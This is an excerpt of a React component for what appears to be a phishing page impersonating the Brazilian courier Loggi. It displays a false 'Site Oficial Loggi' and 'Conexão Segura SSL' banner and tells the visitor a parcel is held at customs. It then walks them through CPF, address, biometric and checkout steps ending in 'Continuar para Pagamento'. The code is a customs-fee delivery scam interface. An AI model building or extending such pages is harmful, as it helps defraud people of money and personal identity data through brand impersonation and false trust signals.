...
const HeroSection = () => {
  const [step, setStep] = useState<"initial" | "tracking" | "cpf" | "code-generated" | "result" | "address" | "biometric" | "checkout">("initial");
    ...
    return (
      <section>
        ...
        <div className="w-full py-2 px-4 flex items-center justify-center gap-2 text-xs font-semibold tracking-wide" style={{ background: "#0044CC", color: "#ffffff" }}>
          ...
          <span>Conexão Segura SSL • Site Oficial Loggi ✓</span>
        </div>
        ...
        <div style={{ background: "#f0f0ee" }} className="pb-16 pt-8">
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }} className="mx-auto max-w-lg px-4">
            <h1 className="text-xl font-bold text-foreground mb-1">Endereço de Entrega</h1>
            <p className="text-xs text-muted-foreground mb-6">Confirme o endereço para entrega da encomenda <span className="font-semibold text-foreground">{trackingCode}</span></p>
            ...
            <div className="rounded-xl overflow-hidden bg-card" style={{ boxShadow: "0 4px 20px rgba(0,0,0,0.1)" }}>
              <div className="px-5 py-4" style={{ background: "hsl(var(--navy))" }}>
                <div className="flex items-center gap-2">
                  ...
                  <span className="text-sm font-bold text-primary-foreground">Endereço para Entrega</span>
                </div>
              </div>
              <div className="p-5 space-y-3">
                <div>
                  <label className="text-[10px] uppercase font-bold text-muted-foreground tracking-wider mb-1 block">CEP</label>
                  <input className="input-track" placeholder="00000-000" maxLength={9} value={address.cep} onChange={async (e) => {
                ...
                <div>
                  <label className="text-[10px] uppercase font-bold text-muted-foreground tracking-wider mb-1 block">Rua / Logradouro</label>
                  <input className="input-track" placeholder="Nome da rua" value={address.rua} onChange={(e) => setAddress({ ...address, rua: e.target.value })} />
                </div>
                <div className="grid grid-cols-3 gap-3">
                  <div>
                    <label className="text-[10px] uppercase font-bold text-muted-foreground tracking-wider mb-1 block">Número</label>
                    <input className="input-track" placeholder="Nº" value={address.numero} onChange={(e) => setAddress({ ...address, numero: e.target.value })} />
                  </div>
                  <div className="col-span-2">
                    <label className="text-[10px] uppercase font-bold text-muted-foreground tracking-wider mb-1 block">Bairro</label>
                    <input className="input-track" placeholder="Bairro" value={address.bairro} onChange={(e) => setAddress({ ...address, bairro: e.target.value })} />
                  </div>
                </div>
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="text-[10px] uppercase font-bold text-muted-foreground tracking-wider mb-1 block">Cidade</label>
                    <input className="input-track" placeholder="Cidade" value={address.cidade} onChange={(e) => setAddress({ ...address, cidade: e.target.value })} />
                  </div>
                  <div>
                    <label className="text-[10px] uppercase font-bold text-muted-foreground tracking-wider mb-1 block">Estado</label>
                    <input className="input-track" placeholder="UF" maxLength={2} value={address.estado} onChange={(e) => setAddress({ ...address, estado: e.target.value.toUpperCase() })} />
                  </div>
                </div>
              </div>
            </div>
            <div className="h-1.5 rounded-b-xl mb-5" style={{ background: "linear-gradient(90deg, hsl(var(--navy-dark)), hsl(var(--navy)), hsl(var(--navy-dark)))" }} />

            <button
              className="btn-consultar"
              disabled={!address.rua || !address.numero || !address.cidade || !address.estado || !address.cep}
              style={{ opacity: (!address.rua || !address.numero || !address.cidade || !address.estado || !address.cep) ? 0.5 : 1 }}
              onClick={() => setStep("biometric")}
            >
              <ArrowRight className="h-4 w-4" />
              Continuar para Pagamento
            </button>
            <button className="flex items-center justify-center gap-1.5 text-xs text-muted-foreground mt-3 w-full hover:text-foreground transition-colors" onClick={() => setStep("result")}>
  ...
  return (
    <section id="consultar">
      ...
      <div className="w-full" style={{ background: "#0055FF" }}>
      ...
      <div className="w-full" style={{ background: "#0044CC" }}>
                ...
                <motion.div key="result" initial={{ opacity: 0, x: 30 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -30 }} transition={{ duration: 0.25 }} className="p-5">
                  ...
                  <div className="space-y-2 mb-5 rounded-lg p-3" style={{ background: "hsl(210, 15%, 97%)", border: "1px solid hsl(210, 20%, 90%)" }}>
                    ...
                    <div className="flex justify-between text-xs">
                      ...
                      <span className="font-semibold" style={{ color: "hsl(0, 72%, 50%)" }}>Retida na Alfândega</span>
                    </div>
                    <div className="h-px" style={{ background: "hsl(210, 20%, 90%)" }} />
                    <div className="flex justify-between text-xs">
                  ...
                  <button className="btn-consultar" style={{ background: "hsl(0, 72%, 45%)" }} onClick={() => setStep("address")}>
